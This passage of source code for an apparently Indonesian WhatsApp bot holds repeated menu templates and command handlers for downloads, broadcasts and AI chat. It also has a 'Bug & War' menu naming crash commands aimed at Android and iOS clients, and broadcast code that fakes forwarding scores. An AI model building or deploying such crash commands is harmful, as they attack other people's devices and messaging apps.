${setv} ${prefix}animewall
${setv} ${prefix}yotsuba
${setv} ${prefix}yuki
${setv} ${prefix}yulibocil
${setv} ${prefix}yumeko
${setv} ${prefix}8ball
${setv} ${prefix}animeawoo
${setv} ${prefix}animemegumin
${setv} ${prefix}animeshinobu
${setv} ${prefix}animehandhold
${setv} ${prefix}animehighfive
${setv} ${prefix}animecringe
${setv} ${prefix}animedance
${setv} ${prefix}animehappy
${setv} ${prefix}animeglomp
${setv} ${prefix}animeblush
${setv} ${prefix}animesmug
${setv} ${prefix}animewave
${setv} ${prefix}animesmille
${setv} ${prefix}animepoke
${setv} ${prefix}animewink
${setv} ${prefix}animebonk
${setv} ${prefix}animebully
${setv} ${prefix}animeyeet
${setv} ${prefix}animebite
${setv} ${prefix}animelick
${setv} ${prefix}animekill
${setv} ${prefix}animecry
${setv} ${prefix}animewlp
${setv} ${prefix}animekiss
${setv} ${prefix}animehug
${setv} ${prefix}animeneko
${setv} ${prefix}animepat
${setv} ${prefix}animeslap
${setv} ${prefix}animecuddle
${setv} ${prefix}animewaifu
${setv} ${prefix}animenom
${setv} ${prefix}animefoxgirl
${setv} ${prefix}animegecg
${setv} ${prefix}animetickle
${setv} ${prefix}animefeed
${setv} ${prefix}animeavatar
${setv} ${prefix}anime
${setv} ${prefix}avatar
${setv} ${prefix}shinobu
${setv} ${prefix}fox_girl
${setv} ${prefix}gecg
╰──────❍`
menuv(xmenu_oh)
}
break
case 'nsfwmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Anime NSFW\` ]┄┄┄┄
${setv} ${prefix}hentai
${setv} ${prefix}gifblowjob
${setv} ${prefix}hentaivid
${setv} ${prefix}hneko
${setv} ${prefix}nwaifu
${setv} ${prefix}animespank
${setv} ${prefix}trap
${setv} ${prefix}blowjob
${setv} ${prefix}cuckold
${setv} ${prefix}milf
${setv} ${prefix}eba
${setv} ${prefix}pussy
${setv} ${prefix}yuri
${setv} ${prefix}zettai
╰──────❍`
menuv(xmenu_oh)
}
break
case 'databasemenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Database\` ]┄┄┄┄
${setv} ${prefix}setcmd
${setv} ${prefix}delcmd
${setv} ${prefix}listcmd
${setv} ${prefix}lockcmd
${setv} ${prefix}addmsg
${setv} ${prefix}delmsg
${setv} ${prefix}getmsg
${setv} ${prefix}listmsg
╰──────❍`
menuv(xmenu_oh)
}
break
case 'storemenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Store\` ]┄┄┄┄
${setv} ${prefix}list
${setv} ${prefix}store
${setv} ${prefix}shop
${setv} ${prefix}addlist
${setv} ${prefix}dellist
╰──────❍`
menuv(xmenu_oh)
}
break
case 'religionmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Religon\` ]┄┄┄┄
${setv} ${prefix}bible
${setv} ${prefix}quran
${setv} ${prefix}gita
╰──────❍`
menuv(xmenu_oh)
}
break
case 'bugmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Bug & War\` ]┄┄┄┄
${setv} ${prefix}xandroid
${setv} ${prefix}xandroid2
${setv} ${prefix}xios
${setv} ${prefix}xios2
${setv} ${prefix}systemuicrash
${setv} ${prefix}xsysui
${setv} ${prefix}🙂
${setv} ${prefix}ioskill
${setv} ${prefix}onekill
╰──────❍`

menuv(xmenu_oh)
}
break
case 'othermenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Other\` ]┄┄┄┄
${setv} ${prefix}ping
${setv} ${prefix}menu
${setv} ${prefix}myip
${setv} ${prefix}repo
${setv} ${prefix}reportbug
${setv} ${prefix}idgroup
${setv} ${prefix}owner
${setv} ${prefix}infoditz
${setv} ${prefix}infobot
${setv} ${prefix}infoowner
${setv} ${prefix}rentbot
${setv} ${prefix}runtime
${setv} ${prefix}confess
${setv} ${prefix}react
${setv} ${prefix}q
${setv} ${prefix}inspect
${setv} ${prefix}tagme
╰──────❍`
menuv(xmenu_oh)
}
break
case 'islamimenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`islami\` ]┄┄┄┄
${setv} ${prefix}kisahnabi
${setv} ${prefix}asmaulhusna
${setv} ${prefix}bacaansholat
${setv} ${prefix}audiosurah
${setv} ${prefix}islamiai
${setv} ${prefix}islamal
${setv} ${prefix}doaharian
${setv} ${prefix}niatsholat
${setv} ${prefix}rentbot
${setv} ${prefix}quotesislami
${setv} ${prefix}doatahlil
╰──────❍`
menuv(xmenu_oh)
}
break
case 'quotesmenu': {
let platform = os.platform()
let d = new Date(new Date + 3600000)
let locale = 'id'
let date = d.toLocaleDateString(locale, {
 day: 'numeric',
 month: 'long',
 year: 'numeric',
 timeZone: 'Asia/Jakarta'
})
let runtime = speed()
let totalreg = Object.keys(global.db.data.users).length
let a = global.db.data.users[m.sender].limit
const me = m.sender
if (!users.registered) return IsReg() 
replygcyuta(mess.loading)
await LoadingReact()
const xmenu_oh = `*こんにちは、${pushname} です。私の名前は ${botname} ʙʏ: ${ownername}${readmore}です。私は WhatsApp ボットです。あなたに同行して、次のことを行うことができます。ダウンローダーツール検索 AIチェックサーバー など基本的に*

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ ]* ----
╠⪼ ʀᴜɴᴛɪᴍᴇ: ${runtime}
╠⪼ sᴄ ᴛʏᴘᴇ: ᴄᴀsᴇ
╠⪼ ᴘᴇʀғɪx: ${prefix}
╠⪼ ᴅᴀᴛᴀʙᴀsᴇ: ${totalreg}
╠⪼ ᴅᴀᴛᴇ: ${date}
╠⪼ ᴍᴏᴅᴇ ʙᴏᴛ: ${Yuta.public ? 'ᴘᴜʙʟɪᴄ' : `sᴇʟғ`}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴜsᴇʀ ]* ----
╠⪼ ɴᴀᴍᴇ: ${pushname}
╠⪼ ɴᴏᴍᴏʀ: ${m.sender.split('@')[0]}
╠⪼ ʟɪᴍɪᴛ: ${a}
╚----------------

╔---- *[ ɪɴғᴏʀᴍᴀsɪ ᴍᴇɴᴜ ]* ----
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟɪsᴛ ᴘᴀᴋᴇ .ʟɪsᴛᴍᴇɴᴜ ᴊᴜɢᴀ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜᴀʟʟ ᴘᴀᴋᴇ .ᴀʟʟᴍᴇɴᴜ
╠⪼ ᴍᴀᴜ ᴍᴇɴᴜʟᴀɪɴ ᴘᴀᴋᴇ ʙᴜᴛᴛᴏɴ
╚----------------

╔┄┄┄┄[ \`Quotes\` ]┄┄┄┄
${setv} ${prefix}quotesanime
${setv} ${prefix}quotesbucin
${setv} ${prefix}quotesbacot
${setv} ${prefix}quotesgalau
${setv} ${prefix}quotesgombal
${setv} ${prefix}quoteshacker
╰──────❍`
menuv(xmenu_oh)
}
break

    case 'ttslide': case 'tiktokslide':{
if (!text.includes('tiktok.com')) return replygcyuta(`• *Example :* .${command} hhttps://vt.tiktok.com/xxxxxxx/`)
if (limituser < 1) return limitAbis();
useLimit(1)
const { tiktok, tiktok2, dlv3, dlv4, dlv5 } = require('./lib/tiktoktop')
const hasil = await dlv5(text)
let leocap = `〆 ᴛɪᴛʟᴇ : ${hasil.title} 〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${hasil.at} 〆 ᴜʀʟ : ${text}`

try {
sendReaction("⏳")//react error
for (let i = 0; i < hasil.data.length; i++) {
let image = hasil.data[i];
await Yuta.sendMessage(m.chat, { image: { url: image.url }, caption: i === 0 ? `${leocap}` : '' }, { quoted: m });
sendReaction("✅")//react error
}
} catch (err) {
sendReaction("❌")//react error
}}
break

case 'getidch': {
if (!m.quoted) return m.reply('reply saluran channel nya lah')
try {
let id = (await m.getQuotedObj()).msg.contextInfo.forwardedNewsletterMessageInfo
await m.reply(`Name: ${id.newsletterName}\nId: ${id.newsletterJid}`)
} catch (e) {
m.reply('Harus chat dari channel bang')
}
}
break

case 'getidgc': {
if (!m.isGroup) return m.reply('Gc Nya Mana?')
try {
let id = await m.key.remoteJid
await replygcyuta(`Id: ${id}`)
} catch (e) {
replygcyuta('harus ke grup .getidgc')
}
}
break

case 'shutdown': case 'r':
if (!YutaTheCreator) return replygcyuta('Khusus Owner!!!')
replygcyuta(`Restarting will be completed in seconds`)
await sleep(3000)
process.exit()
break

case 'pushch': {
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
let messages = (text)
if (!text) return m.reply("Text Nya Mana Woii!")
sendReaction("⏳")
await sleep(6000)
sendReaction("⏳")
let leo = {
  text: messages,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: `〆 ʙʀᴏᴀᴅᴄᴀsᴛ ${botname}`,
      mediaType: 1,
      previewType: 1,
      body: `By Creator: ${ownername}`,
      //previewType: "PHOTO",
      thumbnail: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'),
      renderLargerThumbnail: false,
      mediaUrl: linkch,
      sourceUrl: linkch
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `PushCh By: ${ownername}`,
    }
  }
};
await Yuta.sendMessage(saluran, leo, { quoted: fnews });
replygcyuta(`〆 ᴅoɴᴇ ʟɪᴀᴛ ᴘᴇsᴀɴ ᴅɪ sᴀʟᴜʀᴀɴ

〆 ʟɪɴᴋ ᴄʜ
https://whatsapp.com/channel/0029VadFS3r89inc7Jjus03W`)
await sleep(2000)
sendReaction("✅")
}
break

case 'pushgc': {
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
let messages = (text)
if (!text) return m.reply("Text Nya Mana Woii!")
sendReaction("⏳")
await sleep(6000)
sendReaction("⏳")
let leo = {
  text: messages,
  contextInfo: {
      groupMentions: [
      {
        groupSubject: messages,
        groupJid: m.chat,
      },
    ],
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: `〆 ʙʀᴏᴀᴅᴄᴀsᴛ ${botname}`,
      mediaType: 1,
      previewType: 1,
      body: `By Creator: ${ownername}`,
      //previewType: "PHOTO",
      thumbnail: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'),
      renderLargerThumbnail: false,
      mediaUrl: linkch,
      sourceUrl: linkch
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `PushGc By: ${ownername}`,
    }
  }
};
await Yuta.sendMessage(jidgroup, leo, { quoted: fnews });
replygcyuta(`〆 ᴅoɴᴇ ʟɪᴀᴛ ᴘᴇsᴀɴ ᴅɪ ɢᴄ

〆 ʟɪɴᴋ ɢᴄ
https://whatsapp.com/channel/0029VadFS3r89inc7Jjus03W`)
await sleep(2000)
sendReaction("✅")
}
break
case 'pushstickergc': {
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
let media = await quoted.download()
sendReaction("⏳")
await sleep(6000)
sendReaction("⏳")
await Yuta.sendVideoAsSticker(jidgroup, media, fnews, { packname: global.packname, author: global.author })
await sleep(2000)
sendReaction("✅")
replygcyuta(`〆 ᴅoɴᴇ ʟɪᴀᴛ ᴘᴇsᴀɴ ᴅɪ ɢᴄ

〆 ʟɪɴᴋ ɢᴄ
https://chat.whatsapp.com/JyeT1hdCPJeLy95tzx5eyI`)
}
break
case 'pushchvn': {
if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
//if (!text) return m.reply("id ch nya mana om")
sendReaction("⏳")
await sleep(6000)
sendReaction("⏳")
let leo = {
  audio: await quoted.download(),
  mimetype: "audio/mpeg",
  ptt: true,
  contextInfo: {
      isForwarded: true,
     forwardingScore: 99999,
    externalAdReply: {
      showAdAttribution: true,
      title: botname,
      mediaType: 1,
      previewType: 1,
      body: `By Creator: ${ownername}`,
      //previewType: "PHOTO",
      thumbnail: fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg'),
      renderLargerThumbnail: false,
      mediaUrl: linkch,
      sourceUrl: linkch
   },
    forwardedNewsletterMessageInfo: {
     newsletterJid: saluran,
     serverMessageId: -1,
     newsletterName: `PushChVn By: ${ownername}`,
    }
  }
};
await Yuta.sendMessage(saluran, leo, { quoted: fnews });
replygcyuta(`〆 ᴅoɴᴇ ʟɪᴀᴛ ᴘᴇsᴀɴ ᴀᴜᴅɪᴏ ᴍᴜsɪᴄ ᴅɪ sᴀʟᴜʀᴀɴ

〆 ʟɪɴᴋ ᴄʜ
https://whatsapp.com/channel/0029VadFS3r89inc7Jjus03W`)
await sleep(2000)
sendReaction("✅")
}
break
case 'aio': {
if (!text) return replygcyuta('Masukkan link nya!')
await LoadingReact()
replygcyuta(mess.loading)

try {
  let gtAu = (await axios.post("https://api.cobalt.tools/api/json", {"url": text,}, {headers: {"Content-Type": "application/json", Accept: "application/json"}})).data
  await Yuta.sendMessage(from, {video: {url: gtAu.url}, caption: `Done!`}, {quoted: fnews})
} catch (e) {
  replygcyuta('Tidak dapat mendownload video')
}

try {
  let gtAu = (await axios.post("https://api.cobalt.tools/api/json", {"url": text,"isAudioOnly":"true"}, {headers: {"Content-Type": "application/json", Accept: "application/json"}})).data
  await Yuta.sendMessage(from, {audio: {url: gtAu.url}, mimetype: 'audio/mp4', ptt: false}, {quoted: fnews})
} catch (e) {
  replygcyuta('Tidak dapat mendownload audio')
}

}
break

case 'aio2': {
if (!text) return replygcyuta('Masukkan link nya!')
await LoadingReact()
replygcyuta(mess.loading)
downloadaiomp4()
}
break

case 'aiomusic': {
if (!text) return replygcyuta('Masukkan link nya!')
await LoadingReact()
replygcyuta(mess.loading)
downloadaiomp3
}
break

case 'gemini': {
const gemini = async (input,user,image) => {
  try {
    const response = await axios.post('https://geminiapi.my.id/', {
      text: input,
      user,
      image
    });
    return response.data
  } catch (error) {
    console.error('Error:', error.response ? error.response.data : error.message);
    throw error
  }
};
  try {
    if (!text && !m.quoted) return m.reply("Gunakan perintah ini dengan teks atau merespon gambar. Contoh: *.gemini Hello*",);
    if (text && m.quoted && (m.quoted.mimetype === "image/jpeg" || m.quoted.mimetype === "image/png" )) {
      let img = await m.quoted.download()
      let res = await gemini(text, m.sender, img)
      m.reply(res.result)
    } else if (text){
      let res = await gemini(text, m.sender)
      m.reply(res.result)
    }
  } catch(e) {
    m.reply('Terjadi Eror')
  }
}
break

case 'islamial': case 'Al-Quran': {
if (!text) return replygcyuta('Masukan Text Untuk Islam Contoh : Al Fatihah')
const { QuranChat } = require('./lib/islami')
let g = new QuranChat()
let { data } = await g.query(text)
const verses = data.verses
let teks = `\`[ Hasil ${text} ]\``
let no = 1
for (let i of data.translations) for (let d of data.verses) {
teks += `\n\n\`[ Ayat ${text} ]\` \`[ ${no++} ]\`\n\`[ Text ]\`\n${i.text}\n\`[ Arab ]\`\n${d.text}\n\`[ Footnotes ]\`\n${i.footnotes}\n\n`
}
replygcyuta(`${teks}`)
}
break
case 'ai': {


async function chatBot(messages) {
  try {
    const response = await fetch("https://chatbot-ji1z.onrender.com/chatbot-ji1z", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        messages
      }),
    });
